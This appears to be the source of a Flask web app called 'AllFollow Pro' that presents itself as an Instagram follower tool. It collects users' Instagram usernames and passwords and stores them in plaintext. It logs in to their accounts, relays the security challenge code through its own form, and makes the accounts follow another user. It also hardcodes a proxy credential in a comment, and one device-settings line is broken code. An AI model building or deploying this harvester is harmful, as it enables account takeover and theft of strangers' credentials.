import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, LoginRequired, ProxyError
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "ultimate-fix-66"

db = SQLAlchemy(app)
# PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158" # Eğer proxy sorunluysa kapatıp dene

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(200), default="Sistem Yanıt Bekliyor...")

def login_attempt(u, p):
    with app.app_context():
        cl = Client()
        # cl.set_proxy(PROXY_URL) # Proxy'den şüpheleniyorsan burayı yorum satırı yap
        clients[u] = cl
        acc = IGAccount.query.filter_by(username=u).first()
        
        try:
            # Önce cihazı taklit et (En önemli kısım)
            cl.set_device_settings(cl.delay_range == [2, 5]) 
            print(f"DEBUG: {u} için giriş deneniyor...")
            
            cl.login(u, p)
            acc.status = "AKTİF"
            db.session.commit()
            # Giriş başarılıysa takip başlasın
            cl.user_follow(cl.user_id_from_username("instagram"))
            
        except ChallengeRequired:
            print("DEBUG: Onay kodu istendi (Challenge)")
            acc.status = "ONAY_GEREKLI"
            db.session.commit()
        except BadPassword:
            acc.status = "SIFRE_HATALI"
            db.session.commit()
        except Exception as e:
            error_msg = str(e)
            print(f"DEBUG HATA: {error_msg}")
            if "proxy" in error_msg.lower():
                acc.status = "PROXY_HATASI"
            else:
                acc.status = "ENGEL_YEDI" # Genelde IP engeli
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Bağlantı Kuruluyor..."
    db.session.commit()
    
    threading.Thread(target=login_attempt, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            with app.app_context():
                acc = IGAccount.query.filter_by(username=u).first()
                acc.status = "AKTİF"
                db.session.commit()
            return jsonify(status="success")
        except: return jsonify(status="fail")
    return jsonify(status="error")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>AllFollow Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-zinc-950 text-white font-sans">
    <div id="login-p" class="p-8 mt-20 max-w-sm mx-auto border border-zinc-800 rounded-3xl bg-zinc-900 shadow-2xl">
        <h1 class="text-3xl font-black italic text-center mb-8 tracking-tighter">ALLFOLLOW</h1>
        <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none focus:border-purple-500">
        <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-black rounded-xl mb-4 border border-zinc-700 outline-none focus:border-purple-500">
        <button onclick="start()" id="btn" class="w-full p-4 bg-purple-600 rounded-xl font-bold shadow-lg active:scale-95 transition-all">SİSTEME BAĞLAN</button>
    </div>

    <div id="main-p" class="hidden fixed inset-0 bg-white text-black p-6 overflow-y-auto">
        <div id="status-card" class="bg-purple-600 p-8 rounded-3xl text-white text-center shadow-2xl mb-6">
            <h2 id="st-text" class="text-2xl font-black italic uppercase">BAĞLANIYOR...</h2>
        </div>
        
        <div id="v-area" class="hidden p-6 bg-amber-50 border-2 border-amber-200 rounded-2xl text-center mb-6">
            <p class="text-amber-700 font-bold mb-4 italic text-sm">⚠️ Instagram Güvenlik Kodu İstedi!</p>
            <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-4xl font-mono border-2 border-amber-200 rounded-xl mb-4 outline-none">
            <button onclick="sendCode()" class="w-full bg-amber-600 text-white py-4 rounded-xl font-black uppercase tracking-widest">KODU DOĞRULA</button>
        </div>

        <div class="p-5 border-2 border-gray-100 rounded-2xl flex justify-between items-center bg-gray-50">
            <div><p class="text-[10px] text-gray-400 font-bold">HESAP</p><p id="usr-id" class="font-black text-gray-900"></p></div>
            <div class="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center font-bold text-purple-600 italic">IG</div>
        </div>
    </div>

    <script>
        let cur = "";
        function start() {
            cur = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!cur || !p) return;
            fetch('/api/connect', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:cur, p:p})});
            document.getElementById('login-p').style.display = 'none';
            document.getElementById('main-p').classList.remove('hidden');
            document.getElementById('usr-id').innerText = "@" + cur;
            setInterval(check, 2500);
        }
        async function check() {
            const r = await fetch('/api/status/' + cur);
            const d = await r.json();
            const t = document.getElementById('st-text');
            const v = document.getElementById('v-area');
            const card = document.getElementById('status-card');

            t.innerText = d.status.replace("_", " ");
            
            if(d.status === "AKTİF") {
                card.style.background = "#22c55e";
                v.classList.add('hidden');
            } else if(d.status === "ONAY_GEREKLI") {
                card.style.background = "#f59e0b";
                v.classList.remove('hidden');
            } else if(d.status.includes("HATASI") || d.status.includes("ENGEL")) {
                card.style.background = "#ef4444";
            }
        }
        function sendCode() {
            const c = document.getElementById('vcode').value;
            fetch('/api/verify', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({u:cur, code:c})});
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
